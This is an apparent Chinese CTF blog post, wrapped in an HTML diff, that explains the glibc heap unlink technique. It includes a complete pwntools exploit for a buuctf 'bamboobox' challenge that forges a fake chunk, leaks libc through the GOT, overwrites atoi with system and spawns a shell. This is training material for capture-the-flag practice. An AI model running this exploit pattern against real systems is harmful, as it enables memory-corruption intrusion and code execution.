@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="总结记录ctf pwn中堆的利用方法 unlink整体思路申请chunk1,chunk2,chunk3，然后修改chunk1，伪造出fakechunk 然后free掉chunk1，即可达到*ptr&#x3D;ptr-0x18即list[0]&#x3D;&amp;list[-3]的效果，参照下图。 也就是我们修改list[0]时，就是写入&amp;list[-3]，就可以修改list链上的值，可以任">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Pwn 堆的利用姿势(updating)">
+<meta property="og:url" content="http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="总结记录ctf pwn中堆的利用方法 unlink整体思路申请chunk1,chunk2,chunk3，然后修改chunk1，伪造出fakechunk 然后free掉chunk1，即可达到*ptr&#x3D;ptr-0x18即list[0]&#x3D;&amp;list[-3]的效果，参照下图。 也就是我们修改list[0]时，就是写入&amp;list[-3]，就可以修改list链上的值，可以任">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-20-58-11.png">
+<meta property="og:image" content="http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-21-33-43.png">
+<meta property="og:image" content="http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-21-36-04.png">
+<meta property="article:published_time" content="2022-05-01T12:13:41.000Z">
+<meta property="article:modified_time" content="2022-05-01T14:33:29.498Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-20-58-11.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF-Pwn 堆的利用姿势(updating)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/30/BUUCTF-Pwn-01%E9%9B%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&text=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&is_video=false&description=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF-Pwn 堆的利用姿势(updating)&body=Check out this article: http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&name=CTF-Pwn 堆的利用姿势(updating)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&t=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">1.</span> <span class="toc-text">unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">整体思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">举例</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTF-Pwn 堆的利用姿势(updating)
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/" class="leancloud-visitors" data-flag-title="CTF-Pwn 堆的利用姿势(updating)">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-01T12:13:41.000Z" itemprop="datePublished">2022-05-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>总结记录ctf pwn中堆的利用方法</p>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>申请chunk1,chunk2,chunk3，然后修改chunk1，伪造出fakechunk<br><img src="/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-20-58-11.png"></p>
+<p>然后free掉chunk1，即可达到*ptr&#x3D;ptr-0x18即list[0]&#x3D;&amp;list[-3]的效果，参照下图。</p>
+<p><img src="/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-21-33-43.png"><br>也就是我们修改list[0]时，就是写入&amp;list[-3]，就可以修改list链上的值，可以任意地址写。<br>一般填入如下数据</p>
+<p><img src="/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/2022-05-01-21-36-04.png"></p>
+<p>进而可以泄露真是地址，也可以更改got表，进而getshell。</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>从上面的利用逻辑可以看出，需要提前知道</p>
+<ol>
+<li>list地址</li>
+<li>可以更改标志位<br>所以呢，也就是一般需要有没有开PIE保护，存在越界，比如offbyone\offbynull等。<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2>buuctf hitcontraining_unlink<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27517</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;../libc6_2.23-0ubuntu11_amd64.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;item:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,length,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;item:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#ptr=&amp;list[0]</span></span><br><span class="line">ptr=<span class="number">0x6020C8</span> </span><br><span class="line">	</span><br><span class="line"><span class="comment">#add(0x80,&#x27;aaaa&#x27;)#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">FD=ptr-<span class="number">0x18</span></span><br><span class="line">BK=ptr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造fachunk 大小为0x30</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(FD)+p64(BK)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在chunk1上填入prev_size和size</span></span><br><span class="line">payload+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free chunk1，触发unlink。</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#填入got值</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])<span class="comment">#list[0]</span></span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])<span class="comment">#list[1]</span></span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment">#list[2]</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\x30\x20\x3a\x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#修改atoi_got</span></span><br><span class="line">change(<span class="number">1</span>,<span class="number">8</span>,p64(sys_addr))</span><br><span class="line"><span class="comment">#此时atoi即时system。输入choice即是输入命令。</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">1.</span> <span class="toc-text">unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">整体思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">举例</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&text=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&is_video=false&description=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF-Pwn 堆的利用姿势(updating)&body=Check out this article: http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&title=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&name=CTF-Pwn 堆的利用姿势(updating)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/01/CTF-Pwn-%E5%A0%86%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF-updating/&t=CTF-Pwn 堆的利用姿势(updating)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
